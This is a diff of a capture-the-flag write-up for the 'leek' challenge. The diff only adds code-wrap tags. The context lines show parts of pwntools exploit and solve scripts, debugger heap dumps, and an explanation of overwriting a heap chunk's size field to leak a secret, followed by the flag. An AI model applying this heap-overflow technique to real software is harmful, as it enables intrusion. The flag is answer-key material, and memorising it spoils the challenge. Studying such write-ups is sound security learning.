@@ -26,6 +26,7 @@ layout:
 
 #### source.c (manually renamed)
 
+{% code overflow="wrap" %}
 ```c
 void input(void *user_input)
 {
@@ -107,11 +108,13 @@ void main(void)
   exit(-1);
 }
 ```
+{% endcode %}
 
 -   A chunk of 32 random bytes is created and we need to supply the matching bytes.
 -   Do that 100 times, and we get the flag.
 -   If we send 31 bytes, the output is leaked!
 
+{% code overflow="wrap" %}
 ```bash
 ./leek
 I dare you to leek my secret.
@@ -119,9 +122,11 @@ Your input (NO STACK BUFFER OVERFLOWS!!): aaaabaaacaaadaaaeaaafaaagaaahaaa
 :skull::skull::skull: bro really said: aaaabaaacaaadaaaeaaafaaagaaahaaa
 ��`W;57r';I=׎�͇�t�. Ux+�<�
 ```
+{% endcode %}
 
 #### exploit.py
 
+{% code overflow="wrap" %}
 ```python
 from pwn import *
 
@@ -168,11 +173,13 @@ io.sendlineafter(b'Say what you want:', b'B' * 24)
 # Got Shell?
 io.interactive()
 ```
+{% endcode %}
 
 The secret comparison works but we get a corrupt pointer error when the `random_chunk` is freed.
 
 Set a breakpoint at the free (`break *0x4016b5`):
 
+{% code overflow="wrap" %}
 ```python
 pwndbg> heap
 Allocated chunk | PREV_INUSE
@@ -199,9 +206,11 @@ x/33x 0x704290
 0x704310:	0x00000000
 
 ```
+{% endcode %}
 
 Remember chunk layout:
 
+{% code overflow="wrap" %}
 ```python
     chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
             |             Size of previous chunk, if unallocated (P clear)  |
@@ -218,9 +227,11 @@ nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
             |             Size of next chunk, in bytes                |A|0|1|
             +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 ```
+{% endcode %}
 
 Setup a breakpoint after both chunks were created (`break *0x4015e2`) and check the heap:
 
+{% code overflow="wrap" %}
 ```python
 heap
 
@@ -240,9 +251,11 @@ Top chunk | PREV_INUSE
 Addr: 0x234d2e0
 Size: 0x20d21
 ```
+{% endcode %}
 
 And a snippet of the chunks:
 
+{% code overflow="wrap" %}
 ```python
 vis
 
@@ -255,9 +268,11 @@ vis
 0x234d2d0	0x6dd625b0b35bbbe5	0x339f2c977abf3e7c	..[..%.m|>.z.,.3
 0x234d2e0	0x0000000000000000	0x0000000000020d21	........!....... <-- Top chunk
 ```
+{% endcode %}
 
 So, we should be setting the size of the chunk `0x234d2b0` to `0x31`
 
+{% code overflow="wrap" %}
 ```python
 x/32gx 0x234d280
 0x234d280:	0x0000000000000000	0x0000000000000000
@@ -277,6 +292,7 @@ x/32gx 0x234d280
 0x234d360:	0x0000000000000000	0x0000000000000000
 0x234d370:	0x0000000000000000	0x0000000000000000
 ```
+{% endcode %}
 
 To do that, we supply `0x00 * 24` into the `userinput_chunk` which fills up `0x234d2a0` until we reach the size of the next chunk, where we write `0x31` while being careful to ensure correct padding, e.g. `0x31 + (0x00 * 6)`.
 
@@ -288,6 +304,7 @@ After supplying the secret, we need to repair the heap layout (fix the size of t
 
 #### solve.py
 
+{% code overflow="wrap" %}
 ```python
 from pwn import *
 
@@ -341,5 +358,6 @@ for i in range(100):
 # Got Shell?
 io.interactive()
 ```
+{% endcode %}
 
 Flag: `actf{very_133k_of_y0u_777522a2c32b7dd6}`
